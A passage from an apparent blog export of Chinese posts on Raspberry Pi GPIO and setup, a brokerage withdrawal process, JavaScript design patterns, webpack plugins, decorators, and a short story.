    <content type="text"><![CDATA[本来这篇文章是不存在的，在写《系列 - 树莓派外接蓝牙音箱（四）》的时候，发现还是得先解释下 GPIO。 看到上图，不少同学都会一脸懵逼，各种引脚怎么连线组成电路？电路中用到的电阻、电容、电抗等等改如何使用？其实，大多数情况下，我们并不需要去设计复杂的电路，最多就是给一个元件两端增加电压时，为确保元件不短路，在串联的电路上再加一个负载电阻，如此而已。那么滤波、放大等电路的设计，一时半会儿还不会用到。 看图识引脚树莓派除了有 USB、网口、HDMI 等常见的接口外，还提供了 GPIO（General Purpose Input/Output）接口，通过这个接口，我们可以很方便的控制电子元器件。本文不去分析 I2C、UART、SPI 这些略复杂的通讯协议，只去看 GPIO 在引脚上的输入和输出，以及高低点位的变化。 上图所示的几个基础引脚我们还是可以一眼看明白的，DC Power 5.0v，以及 DC Power 3.3v，它们指的是直流电电压 5.0 或 3.3 伏特，可以简单理解成电池的正极，在图中可以看出 PIN01 和 PIN17 两个引脚输出的是 3.3v 电压，PIN02 和 PIN04 输出的是 5.0v 电压；还有好几个 Ground 引脚，它们直接接地，可以理解成电池的负极。 PIN 引脚标号和 GPIO 标号是不一样的，不要把 GPIO12 理解成了是 PIN12，PINX 是物理位置，GPIOX 是引脚号码。图中引脚 Name 用灰色括号标注的内容是我们暂不去理解的 I2C、SPI 等协议会用到的引脚。 上图是 Raspberry Pi 3 Model B+ 的板子，右侧 40 个引脚，与第一张 GPIO Header 图是一一对应的。 串口编程在树莓派系统中，已经实现了文件到 GPIO 引脚的对应，也就是说，只要我们去修改系统中指定的文件和文件状态，就可以修改 GPIO 引脚的电位状态。 SSH 远程到树莓派，进入 /sys/class/gpio/ 目录，可以看到目录中有两个关键的文件： export，enable 控制某个引脚 unexport，disbale 控制某个引脚 它们可以用来控制引脚的状态。比如，我们要控制 GPIO14 引脚，可以将它的状态设置为 out（分为 in 和 out 两种模式，in 是接受电位信号，out 是输出电位信号），然后将它设置为高电位（1 为高电位，0 为低电位）。 1234567# enable GPIO14echo 14 &gt; /sys/class/gpio/export# 注意观察，在 /sys/class/gpio/ 目录下多了一个文件夹 gpio14# 将其设置为 out 模式echo out &gt; /sys/class/gpio/gpio14/direction# 将其设置为高电位echo 1 &gt; /sys/class/gpio/gpio14/value 电位测试在系列第一篇中，有提到，我买了一堆感应器，其中有一个叫做 TWO-COLOR Module，大小双色模块， 上方是共阴模块，下方是共阳模块，共阳的意思就是 B/R/G 都接负极，C 接正极；它的电路结构如下： 现在我们来测试下 GPIO14 引脚的电位输出，PIN06 是 Ground，也就是接地负极；而 GPIO14（PIN08 引脚） 由于之前的操作，我们已经将它设置成了高电位。将 C 与 Ground 连接，R 与 GPIO14 连接后，R（红灯）会亮，我们试试： 然后将 GPIO14 设置为低电位，测试等是否灭掉： 12# 将 gpio14 设置为高电位echo 1 &gt; /sys/class/gpio/gpio14/value 此时二极管两侧电压为 0，灯灭，测试完成；最后我们把 gpio14 引脚关掉： 1echo 14 &gt; /sys/class/gpio/unexport 程序控制引脚既然 Linux 串口 Bash 编程可以控制 GPIO 引脚的信号，自然也可以用高级语言去控制。下面我们使用 Nodejs 写一个小 Demo —— 让双色模块的红灯和绿灯，每隔 1s 交替闪动。 简单画一下电路图： GPIO18 和 GPIO23 引脚分别连接共阴双色模块的红色（R）和绿色（G）二极管，然后开始编程。Python 非常适合进行串口编程，而且社区上有很多 Python 库，但本系列会尽量不使用 Python，而是 Nodejs；Nodejs 在这个领域的社区沉淀还不是很多，通过一段时间的摸索，也期望可以沉淀些有用的模块出来。 为方便测试，就直接使用了月影封装的 rpio2 模块，他的 API 设计得比较符合人性： 12345678910111213141516171819202122232425262728293031const Gpio = require('rpio2').Gpio;// 初始化 PIN12，与 R 连接，设置为输出高电位const r = new Gpio(12);r.open(Gpio.OUTPUT, Gpio.HIGH);// 初始化 PIN 16，与 G 连接，设置为输出低电位const g = new Gpio(16);g.open(Gpio.OUTPUT, Gpio.LOW);async function wait(seconds) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(); &#125;, (seconds || 1) * 1E3); &#125;);&#125;async function main() &#123; console.log('start!'); let counter = 10; while(counter--) &#123; await wait(); r.toggle(); g.toggle(); &#125;&#125;main().then(() =&gt; &#123; r.close(); g.close(); console.log('shutdown!');&#125;); 代码比较好理解，每隔 1s 交替闪灯，总共闪 10 次。Demo 效果预览： 对于 GPIO 的介绍就到这里，基础的使用实在是太简单了，本文可以勾起一些对硬件完全不了解的同学的好奇心和求知欲，不过对我这个电信出身的同学而言，就没啥值得兴奋的了。]]></content>
      <categories>
        <category>硬件开发</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系列 - 树莓派装机（二）]]></title>
    <url>%2Fblog%2F2018%2F06%2F14%2F2018-06-14-rasyberry-pi-os%2F</url>
    <content type="text"><![CDATA[似乎市面上的文章都是教大家如何在 Windows 环境下玩树莓派，Mac 下的文章零零散散的，稍微少了些，我打算所有的环节都在 Mac 上完成，记录下每一次探索遇到的坑。本节将给大家介绍，如何从树莓派上进入到自己熟悉的远程开发模式。 散热装置在开搞之前，我觉得还是需要给树莓派贴上几块散热片，再把风扇装上；否则，插上电源，啥也不干，板子便会发烫。 散热片 我买的这个板子，CPU 自带散热，所以这三块散热片应该分别装在 WiFi/蓝牙模块、以太网卡和内存片（背面）上。 小风扇 小风扇两个引脚与树莓派的引脚相连，黑色接地，红色接 Vcc 5.0V。然后放进壳子里，就是这样啦： 小风扇无声地转起来了。 系统安装首先，通过 Mac 自带的 Disk 工具格式化储存卡： 注意，这里的格式是 MS-DOS(FAT)，能否设置成其他格式，没研究，格式化完成以后卸载分区： 1234567891011# 找到磁盘对应的 Filesystem 名（DISKNAME）df -h# 卸载分区，这里的 DISKNAME 长得像 /dev/disk2s1 diskutil unmout DISKNAME# 找到磁盘，看磁盘大小区分diskutil list# list 命令结果/dev/disk2 (external, physical): #: TYPE NAME SIZE IDENTIFIER 0: FDisk_partition_scheme *15.9 GB disk2 1: DOS_FAT_32 BARRET-PI 15.9 GB disk2s1 然后先去官网下载 raspberrypi 的 操作系统，直接下载系统貌似略慢，可以下载 torrent，然后使用迅雷下载。 下载下来的是一个 zip 包，解压后，执行下方命令，将镜像写入到磁盘： 1234567# dd 命令用于转换或者复制一个文件# bs 是 benchmark 测试# if 是镜像地址# of 是写入磁盘区间sudo dd bs=4m if=2018-04-18-raspbian-stretch.img of=/dev/rdisk2# 磁盘写入完成以后diskutil unmountDisk /dev/disk2 整个写入操作，花了 8 分多钟——真是够慢——只能说店家送的这个 SD 卡略烂吧。给树莓派插上 SD 卡，然后插上电源，注意观察红灯和绿灯的闪灯，红灯应该只一直亮着，绿灯在前几十秒亮着，等到系统加载成功，绿色会快速闪动然后灭掉。如果你的等不是这么闪的，那么有可能遇到了这么几种情况： 你的树莓派板子坏了，概率比较小 你的板子跟系统不匹配，重新找个系统吧，最好去官网下载 你的 SD 卡与板子不兼容，这里是所有可以用的 SD 卡列表 连接系统在 Mac 下通过网线连接树莓派，你需要这个转换器： 树莓派提供了 DHCP 服务，我们可以让 Mac 连接到树莓派局域网，依次打开 System Preferences -&gt; Sharing -&gt; Internet Sharing，勾选 Thunderbolt Ethernet 后在勾选 Internet Sharing，此时你的 Mac 就会自动连接树莓派了，然后找到树莓派对应的 IP，通过 ssh 连接上去就行了。 「然后找到树莓派对应的 IP，通过 ssh 连接上去就行了」，注意，这里有很多坑… 可能是因为缓存的原因吧，在 Mac 上执行 arp -a 不一定能找到 raspberry 设备；所以，我建议你还是去下载一个 IP 扫描的工具，它会清楚地告诉你 IP 是多少： ssh pi@192.168.2.2 你会发现连接不上，提示 Connection refused，网上找了下，不少人被坑： 树莓派最新的 raspberry 系统（2016.11.25日更新的系统）默认是关闭 ssh 功能的，如果可以连接屏幕，进入系统开启即可。如果只能连 ssh，先将 sd 卡取出，插入电脑，在 boot 分区新建个ssh文件夹即可，包括完整版和 lite 版。 好吧，只能说，“板子，我服你~”。最后看到了这个界面，心情就舒畅多了： 自动 WiFi 链接执行 iwlist scan 对于没有无线网卡驱动的板子，会提示错误，当然也可能是没有打开 WiFi，可以通过 sudo ifup wlan0 开启。 自动 WiFi 链接分为两步，首先将 /etc/network/interfaces 中的手动连接修改成自动，修改方式： 1234- iface wlan0 inet manual- wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf+ iface wlan0 inet dhcp+ wpa_conf /etc/wpa_supplicant/wpa_supplicant.conf 第二步，在 /etc/wpa_supplicant/wpa_supplicant.conf 中设置需要连接的 WiFi 名和密码： 12345678910nework=&#123;[TAB]ssid="WIFI_NAME"[TAB]psk="WIFI_PASSWORD"[TAB]priority=1&#125;nework=&#123;[TAB]ssid="WIFI_NAME_2"[TAB]psk="WIFI_PASSWORD_2"[TAB]priority=2&#125; 这里的 [TAB] 为 tab 符号输入；可以设置多个 WiFi，其中 priority 为优先级，直接在文件后加入这些配置，原有的内容不要动。 这里需要注意的是，如果你的板子正通过网线与电脑连接，此时 eth0 已经处于链接状态，wlan0 是无法连接的；需要你断开网线，然后重启板子，才能连接 WiFi。 好吧，今天就折腾到这里，下一节，我们来看一看如何通过外接的蓝牙音箱播放树莓派音乐。]]></content>
      <categories>
        <category>硬件开发</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系列 - 入坑树莓派（一）]]></title>
    <url>%2Fblog%2F2018%2F06%2F12%2F2018-06-12-rasyberry-pi-start%2F</url>
    <content type="text"><![CDATA[树莓派，是一款基于 Linux 的单板机，配上一些可交互的硬件设备（扩展屏、鼠标、键盘等），也就成了一款配置略低的电脑。 目的电脑能做什么事情不必多说，倘若买一块树莓派的板子就是为了玩软件、学习 Linux 系统，那就有点太无趣了；我的目标是通过树莓派深入了解它的 IO 引脚控制（包括几个总线通讯协议）及各类硬件传感器的使用，尝试写写 Linux 内核驱动，再顺便回顾下大学里学的电路原理课程，最终目的是通过各种软硬件的组合实现一些小创意，帮助改善生活质量。 当然，我可以去直接网上购买智能家具家电，不过其中的趣味想必就少了许多，而且脑海中的一些创意还没有被小米这样的厂商产品化，只能自己动手实现啦~ 趣味和挑战从正式接触编程到如今，也有 7 个年头了，Linux 系统，包括系统上的各种环境配置、软件使用，可以说熟悉的不能再熟悉了，我对系统底层的东西（系统、内核）兴趣度不高，所以把应用层尤其是软件摸索的差不多了，Linux 也就用的少了，毕竟它不适合平时办公和娱乐。 树莓派提供的 IO 引脚可以直接控制底层硬件，通过硬件的配套驱动，可以在操作系统层做很多非常有意思的软硬件联动开发，相比单纯把玩应用层和协议层的东西，能够控制实物硬件，还是很有趣味性的。不过有趣的同时，也会有很多挑战，比如电路设计、驱动开发、硬件通讯协议的研究等等。 上货没做太多的调研，问了下身边搞 IoT 开发的同事，让他直接推了几个淘宝链接。 一个 Raspberry Pi 3 Model B+ Linux 开发板 一盒子感应器，三四十个 上面的硬件，淘宝上随随便便就可以搜到，没什么太大的差异，就不贴链接了，如果一定要推荐，可以在 官方授权的淘宝店 上购买。我们来看看这块板子的配置： 这块最新的树莓派板载蓝牙和 WiFi 模块，而且各方面的性能都还不错，提供了 4 个 USB 接口和一个全尺寸的 HDMI 接口，基本上可以满足我们的日常开发需求。 期望在小米商城买了四五十件智能产品，说实话，小米的产品确实不错，提供的米家 APP 操作起来也十分方便，但是小米的智能家电无法对外提供服务，只能在小米的体系内运转，因此就显得过于薄弱了些。 把玩树莓派，我大致给自己定下这么几个目标： 熟练使用 GPIO 和各类总线协议进行硬件和设备的连接、控制 了解常见的标准数据传输协议，如蓝牙传输、红外遥控、AirPlay 等 掌握基本的 Linux 内核驱动开发的过程，并尝试为硬件编写驱动程序 了解边缘计算的整体架构，将家里的所有设备集结在一个端上控制，争取上云 下一节来说说，如何进入到自己熟悉的远程开发模式。]]></content>
      <categories>
        <category>硬件开发</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中银国际提款到香港招行一卡通]]></title>
    <url>%2Fblog%2F2018%2F05%2F30%2F2018-05-30-%E4%B8%AD%E9%93%B6%E5%9B%BD%E9%99%85%E6%8F%90%E6%AC%BE%E5%88%B0%E9%A6%99%E6%B8%AF%E6%8B%9B%E8%A1%8C%E4%B8%80%E5%8D%A1%E9%80%9A%2F</url>
    <content type="text"><![CDATA[用过中银国际的人都知道，它是一个很渣的平台，至于渣到什么程度，有机会你可以去体会一下。 如果你从来没有玩过股票（或炒币）、没有换过汇，折腾起来还是有点费力的，下面我用通俗一点的话来简单说一说大致的流程。 交易我们把交易的前置流程省略掉 —— 默认你不会傻到把钱转入中银国际，然后在这个渣平台上购买股票。 在中银国际上支持美元、港元和人民币交易，交收日是 T+2，比如你当天卖出股票，两天后钱才会到账，这两天中你的钱会出现在「未交收金额」一栏中，不可用。 如果你点子比较低，遇到了他们的公众假期或者周六、周日，那么对不起，T+2，就会变成 T+2+假期时间，往后顺延… 提现先说说你有香港银行卡的情况，如果你有香港的银行卡，提现就稍微方便一点。 首先，你需要去它的官网上下载一份 PDF 文档，填写你的香港银行卡信息，然后拍照发送到 service@bocigroup.com，大概一周左右可以完成香港银行卡的绑定。 绑定好了以后，在你的中银国际提款界面就可以发现香港银行卡的选项了。提现需要 1~2 天，如果遇到公休日，顺延… 如果你没有香港银行卡，你需要下载一份 PDF 文档，填写你的转账信息，然后拍照发到上面那个邮箱，到时候会扣你 200 港元或者 25 美金的电汇手续费，然后等待 3~5 天完成提现。 换汇第一次打开香港一卡通的客户端也是略微有点懵逼的，不过知道各个菜单项是什么意思了，感觉也还好。关于香港一卡通的办理和使用，我之前写过一篇随笔。 需要注意的是，每人每年只有 5w 刀的的结汇额度，你可以在香港一卡通上把美金/港币换成人民币（这个过程成为之换汇）再转入到国内银行，也可以先转入国内银行再换汇（或者不换汇直接使用）。前者会占用结汇额度，不需要手续费（人民币转账不需要手续费），而美金/港币转账需要收取每笔 11 美金或者 80 港币的手续费。 大部分情况消费都是人民币，所以你可以在香港一卡通换汇完成后再转入国内。这个过程，没有时延，都是及时到账。 小结整个流程，不得不说很折腾，中银国际只有网页客户端，手机 iOS 客户端不支持美元账户操作，而且使用的都是上古风，80 年代的交互模式，特别恶心；所以很多人都会选择把中银国际中的股票转移到富途牛牛类似的客户端上操作，体验真的好多了。 香港一卡通也有点恶心，客户端只支持 Windows，而且还需要一个 uKey 操作，虽说保证了安全，但是体验也是一坨翔。 上次更新证书还除了点小毛病，香港专业客户端更新总是失败，客服告诉我先安装招行专业版客户端，更新证书，此操作对香港专业客户端也生效。 中银国际恶心的地方除了每次要等待几天以外，客服电话也长期占线，排队打不通。如果你有问题，还是建议通过上面提到的邮件沟通，一般都会回复。 好吧，就记录这么多；读者有什么问题多去问客服吧，或者网上检索下。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>香港一卡通</tag>
        <tag>中银国际</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 中常见设计模式整理]]></title>
    <url>%2Fblog%2F2018%2F05%2F18%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[开发中，我们或多或少地接触了设计模式，但是很多时候不知道自己使用了哪种设计模式或者说该使用何种设计模式。本文意在梳理常见设计模式的特点，从而对它们有比较清晰的认知。 JavaScript 中常见设计模式 单例模式 策略模式 代理模式 迭代器模式 发布-订阅模式 命令模式 组合模式 模板方法模式 享元模式 职责链模式 中介者模式 装饰者模式 状态模式 适配者模式 观察者模式 各设计模式关键词看完了上述设计模式后，把它们的关键词特点罗列出来，以后提到某种设计模式，进而联想相应的关键词和例子，从而心中有数。 设计模式 特点 案例 单例模式 一个类只能构造出唯一实例 创建菜单对象 策略模式 根据不同参数可以命中不同的策略 动画库里的算法函数 代理模式 代理对象和本体对象具有一致的接口 图片预加载 迭代器模式 能获取聚合对象的顺序和元素 each([1, 2, 3], cb) 发布-订阅模式 PubSub 瀑布流库 命令模式 不同对象间约定好相应的接口 按钮和命令的分离 组合模式 组合模式在对象间形成一致对待的树形结构 扫描文件夹 模板方法模式 父类中定好执行顺序 咖啡和茶 享元模式 减少创建实例的个数 男女模具试装 职责链模式 通过请求第一个条件，会持续执行后续的条件，直到返回结果为止 if else 优化 中介者模式 对象和对象之间借助第三方中介者进行通信 测试结束告知结果 装饰者模式 动态地给函数赋能 天冷了穿衣服，热了脱衣服 状态模式 每个状态建立一个类，状态改变会产生不同行为 电灯换挡 适配者模式 一种数据结构改成另一种数据结构 枚举值接口变更 观察者模式 当观察对象发生变化时自动调用相关函数 vue 双向绑定 参考文献*《JavaScript设计模式与开发实践》]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[探寻 webpack 插件机制]]></title>
    <url>%2Fblog%2F2018%2F04%2F13%2F%E6%8E%A2%E5%AF%BB%20webpack%20%E6%8F%92%E4%BB%B6%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[webpack 可谓是让人欣喜又让人忧，功能强大但需要一定的学习成本。在探寻 webpack 插件机制前，首先需要了解一件有意思的事情，webpack 插件机制是整个 webpack 工具的骨架，而 webpack 本身也是利用这套插件机制构建出来的。因此在深入认识 webpack 插件机制后，再来进行项目的相关优化，想必会大有裨益。 webpack 插件先来瞅瞅 webpack 插件在项目中的运用 12345678const MyPlugin = require('myplugin')const webpack = require('webpack')webpack(&#123; ..., plugins: [new MyPlugin()] ...,&#125;) 那么符合什么样的条件能作为 webpack 插件呢？一般来说，webpack 插件有以下特点： 独立的 JS 模块，暴露相应的函数 函数原型上的 apply 方法会注入 compiler 对象 compiler 对象上挂载了相应的 webpack 事件钩子 事件钩子的回调函数里能拿到编译后的 compilation 对象，如果是异步钩子还能拿到相应的 callback 下面结合代码来看看： 12345678910function MyPlugin(options) &#123;&#125;// 2.函数原型上的 apply 方法会注入 compiler 对象MyPlugin.prototype.apply = function(compiler) &#123; // 3.compiler 对象上挂载了相应的 webpack 事件钩子 4.事件钩子的回调函数里能拿到编译后的 compilation 对象 compiler.plugin('emit', (compilation, callback) =&gt; &#123; ... &#125;)&#125;// 1.独立的 JS 模块，暴露相应的函数module.exports = MyPlugin 这样子，webpack 插件的基本轮廓就勾勒出来了，此时疑问点有几点， 疑问 1：函数的原型上为什么要定义 apply 方法？阅读源码后发现源码中是通过 plugin.apply() 调用插件的。 1234567const webpack = (options, callback) =&gt; &#123; ... for (const plugin of options.plugins) &#123; plugin.apply(compiler); &#125; ...&#125; 疑问 2：compiler 对象是什么呢？ 疑问 3：compiler 对象上的事件钩子是怎样的？ 疑问 4：事件钩子的回调函数里能拿到的 compilation 对象又是什么呢？ 这些疑问也是本文的线索，让我们一个个探索。 compiler 对象compiler 即 webpack 的编辑器对象，在调用 webpack 时，会自动初始化 compiler 对象，源码如下： 1234567891011121314// webpack/lib/webpack.jsconst Compiler = require("./Compiler")const webpack = (options, callback) =&gt; &#123; ... options = new WebpackOptionsDefaulter().process(options) // 初始化 webpack 各配置参数 let compiler = new Compiler(options.context) // 初始化 compiler 对象，这里 options.context 为 process.cwd() compiler.options = options // 往 compiler 添加初始化参数 new NodeEnvironmentPlugin().apply(compiler) // 往 compiler 添加 Node 环境相关方法 for (const plugin of options.plugins) &#123; plugin.apply(compiler); &#125; ...&#125; 终上，compiler 对象中包含了所有 webpack 可配置的内容，开发插件时，我们可以从 compiler 对象中拿到所有和 webpack 主环境相关的内容。 compilation 对象compilation 对象代表了一次单一的版本构建和生成资源。当运行 webpack 时，每当检测到一个文件变化，一次新的编译将被创建，从而生成一组新的编译资源。一个编译对象表现了当前的模块资源、编译生成资源、变化的文件、以及被跟踪依赖的状态信息。 结合源码来理解下上面这段话，首先 webpack 在每次执行时会调用 compiler.run() (源码位置)，接着追踪 onCompiled 函数传入的 compilation 参数，可以发现 compilation 来自构造函数 Compilation。 12345678// webpack/lib/Compiler.jsconst Compilation = require("./Compilation");newCompilation(params) &#123; const compilation = new Compilation(this); ... return compilation;&#125; 不得不提的 tapable 库再介绍完 compiler 对象和 compilation 对象后，不得不提的是 tapable 这个库，这个库暴露了所有和事件相关的 pub/sub 的方法。而且函数 Compiler 以及函数 Compilation 都继承自 Tapable。 事件钩子事件钩子其实就是类似 MVVM 框架的生命周期函数，在特定阶段能做特殊的逻辑处理。了解一些常见的事件钩子是写 webpack 插件的前置条件，下面列举些常见的事件钩子以及作用： 钩子 作用 参数 类型 after-plugins 设置完一组初始化插件之后 compiler sync after-resolvers 设置完 resolvers 之后 compiler sync run 在读取记录之前 compiler async compile 在创建新 compilation 之前 compilationParams sync compilation compilation 创建完成 compilation sync emit 在生成资源并输出到目录之前 compilation async after-emit 在生成资源并输出到目录之后 compilation async done 完成编译 stats sync 完整地请参阅官方文档手册，同时浏览相关源码 也能比较清晰地看到各个事件钩子的定义。 插件流程浅析拿 emit 钩子为例，下面分析下插件调用源码： 123compiler.plugin('emit', (compilation, callback) =&gt; &#123; // 在生成资源并输出到目录之前完成某些逻辑&#125;) 此处调用的 plugin 函数源自上文提到的 tapable 库，其最终调用栈指向了 hook.tapAsync()，其作用类似于 EventEmitter 的 on，源码如下： 123456789101112131415// Tapable.jsoptions =&gt; &#123; ... if(hook !== undefined) &#123; const tapOpt = &#123; name: options.fn.name || "unnamed compat plugin", stage: options.stage || 0 &#125;; if(options.async) hook.tapAsync(tapOpt, options.fn); // 将插件中异步钩子的回调函数注入 else hook.tap(tapOpt, options.fn); return true; &#125;&#125;; 有注入必有触发的地方，源码中通过 callAsync 方法触发之前注入的异步事件，callAsync 类似 EventEmitter 的 emit，相关源码如下： 12345this.hooks.emit.callAsync(compilation, err =&gt; &#123; if (err) return callback(err); outputPath = compilation.getPath(this.outputPath); this.outputFileSystem.mkdirp(outputPath, emitFiles);&#125;); 一些深入细节这里就不展开了，说下关于阅读比较大型项目的源码的两点体会， 要抓住一条主线索去读，忽视细节。否则会浪费很多时间而且会有挫败感； 结合调试工具来分析，很多点不用调试工具的话很容易顾此失彼； 动手实现个 webpack 插件结合上述知识点的分析，不难写出自己的 webpack 插件，关键在于想法。为了统计项目中 webpack 各包的有效使用情况，在 fork webpack-visualizer 的基础上对代码升级了一番，项目地址。效果如下： 插件核心代码正是基于上文提到的 emit 钩子，以及 compiler 和 compilation 对象。代码如下： 123456789101112131415161718192021222324252627class AnalyzeWebpackPlugin &#123; constructor(opts = &#123; filename: 'analyze.html' &#125;) &#123; this.opts = opts &#125; apply(compiler) &#123; const self = this compiler.plugin("emit", function (compilation, callback) &#123; let stats = compilation.getStats().toJson(&#123; chunkModules: true &#125;) // 获取各个模块的状态 let stringifiedStats = JSON.stringify(stats) // 服务端渲染 let html = `&lt;!doctype html&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;AnalyzeWebpackPlugin&lt;/title&gt; &lt;style&gt;$&#123;cssString&#125;&lt;/style&gt; &lt;div id="App"&gt;&lt;/div&gt; &lt;script&gt;window.stats = $&#123;stringifiedStats&#125;;&lt;/script&gt; &lt;script&gt;$&#123;jsString&#125;&lt;/script&gt; ` compilation.assets[`$&#123;self.opts.filename&#125;`] = &#123; // 生成文件路径 source: () =&gt; html, size: () =&gt; html.length &#125; callback() &#125;) &#125;&#125; 参考资料看清楚真正的 Webpack 插件 webpack 官网]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS 装饰器解析]]></title>
    <url>%2Fblog%2F2018%2F03%2F19%2F%E8%A3%85%E9%A5%B0%E5%99%A8%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[随着 ES6 和 TypeScript 中类的引入，在某些场景需要在不改变原有类和类属性的基础上扩展些功能，这也是装饰器出现的原因。 装饰器简介作为一种可以动态增删功能模块的模式(比如 redux 的中间件机制)，装饰器同样具有很强的动态灵活性，只需在类或类属性之前加上 @方法名 就完成了相应的类或类方法功能的变化。 不过装饰器模式仍处于第 2 阶段提案中，使用它之前需要使用 babel 模块 transform-decorators-legacy 编译成 ES5 或 ES6。 在 TypeScript 的 lib.es5.d.ts 中，定义了 4 种不同装饰器的接口，其中装饰类以及装饰类方法的接口定义如下所示： 12declare type ClassDecorator = &lt;TFunction extends Function&gt;(target: TFunction) =&gt; TFunction | void;declare type MethodDecorator = &lt;T&gt;(target: Object, propertyKey: string | symbol, descriptor: TypedPropertyDescriptor&lt;T&gt;) =&gt; TypedPropertyDescriptor&lt;T&gt; | void; 下面对这两种情况进行解析。 作用于类的装饰器当装饰的对象是类时，我们操作的就是这个类本身。 123456789@logclass MyClass &#123; &#125;function log(target) &#123; // 这个 target 在这里就是 MyClass 这个类 target.prototype.logger = () =&gt; `$&#123;target.name&#125; 被调用`&#125;const test = new MyClass()test.logger() // MyClass 被调用 由于装饰器是表达式，我们也可以在装饰器后面再添加提个参数： 1234567891011@log('hi')class MyClass &#123; &#125;function log(text) &#123; return function(target) &#123; target.prototype.logger = () =&gt; `$&#123;text&#125;，$&#123;target.name&#125; 被调用` &#125;&#125;const test = new MyClass()test.logger() // hello，MyClass 被调用 在使用 redux 中，我们最常使用 react-redux 的写法如下： 12@connect(mapStateToProps, mapDispatchToProps)export default class MyComponent extends React.Component &#123;&#125; 经过上述分析，我们知道了上述写法等价于下面这种写法： 12class MyComponent extends React.Component &#123;&#125;export default connect(mapStateToProps, mapDispatchToProps)(MyComponent) 作用于类方法的装饰器与装饰类不同，对类方法的装饰本质是操作其描述符。可以把此时的装饰器理解成是 Object.defineProperty(obj, prop, descriptor) 的语法糖，看如下代码： 1234567891011121314151617class C &#123; @readonly(false) method() &#123; console.log('cat') &#125;&#125;function readonly(value) &#123; return function (target, key, descriptor) &#123; // 此处 target 为 C.prototype; key 为 method; // 原 descriptor 为：&#123; value: f, enumarable: false, writable: true, configurable: true &#125; descriptor.writable = value return descriptor &#125;&#125;const c = new C()c.method = () =&gt; console.log('dog')c.method() // cat 可以看到装饰器函数接收的三个参数与 Object.defineProperty 是完全一样的，具体实现可以看 babel 转化后的代码，主要实现如下所示： 123456789101112var C = (function() &#123; class C &#123; method() &#123; console.log('cat') &#125; &#125; var temp temp = readonly(false)(C.prototype, 'method', temp = Object.getOwnPropertyDescriptor(C.prototype, 'method')) || temp // 通过 Object.getOwnPropertyDescriptor 获取到描述符传入到装饰器函数中 if (temp) Object.defineProperty(C.prototype, 'method', temp) return C&#125;)() 再将再来看看如果有多个装饰器作用于同一个方法上呢？ 12345class C &#123; @readonly(false) @log method() &#123; &#125;&#125; 经 babel 转化后的代码如下： 123456desc = [readonly(false), log] .slice() .reverse() .reduce(function(desc, decorator) &#123; return decorator(target, property, desc) || desc; &#125;, desc); 可以清晰地看出，经过 reverse 倒序后，装饰器方法会至里向外执行。 相关链接javascript-decoratorsJavascript 中的装饰器JS 装饰器（Decorator）场景实战修饰器Babel]]></content>
      <categories>
        <category>decorators</category>
      </categories>
      <tags>
        <tag>decorators</tag>
        <tag>ES7</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[陪伴]]></title>
    <url>%2Fblog%2F2018%2F03%2F01%2F2018-03-01-%E9%99%AA%E4%BC%B4%2F</url>
    <content type="text"><![CDATA[正值初春，不到七点夜幕就被揪了下来，窗户已挂上了一层宁静的夜色。 “都过了晚饭时间了，怎么还没回来。”，她心里嘀咕着。 子涵是一家互联网公司的员工，每天忙到三餐只顾得上早餐，还是老婆给准备的，这不，今天又把晚饭时间贡献给了业务。每到饭点，子涵的老婆夏月就会给他打一个电话，真切地问清楚，到底吃了没。 南方的天气过了冬便开始古怪起来，白天太阳晒得人懒洋洋的，到了夜里就凉飕飕，门缝还时不时吹响口哨。一间小室，一个人，还是显得太大了。 六点多，子涵的手机拨进过一个电话，震动响起时，子涵正皱着眉头盯着电脑屏幕，左手伸过去准备取手机，一条消息弹了出来，又把手收了回来；键盘敲下几个字后，案头的震动声没了，就把这事儿给忘了。那是夏月打过来的，家里的做好的饭菜都快凉了。 “什么？还要改！这个地方都改了三遍了，能不能悠着点啊…”，子涵在电话里吼了起来，“确定的部分就不要再改了，没确定的部分先别提过来，咱们尽量把有限的时间投在有价值的事情上，生命太短暂！”。项目室内一直弥漫着紧张的气息，有点让人喘不过气来。这个项目的需求是倒推着时间来的，上线节奏早就定好了，大家都很无奈。 电脑上飘出一条消息，“不要你了！（来自老婆）”，子涵瞟了一眼，点击了关闭，继续埋头敲打着键盘。 今天是周五，子涵本来答应了早点回家吃饭的，不过看今天的情形是有点够呛了。点开微信，回复了一句：“你先吃吧。” 回车键刚按下，夏月就发来了一条新消息：“等你。” （未完待续） 题图：https://gfamily.cwgv.com.tw/public/upload/articles/98/998/preview/998.png]]></content>
      <categories>
        <category>随笔</category>
        <category>观点和想法</category>
      </categories>
      <tags>
        <tag>陪伴</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有点强迫症的程序员]]></title>
    <url>%2Fblog%2F2018%2F02%2F27%2F2018-02-27-%E6%9C%89%E7%82%B9%E5%BC%BA%E8%BF%AB%E7%97%87%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98%2F</url>
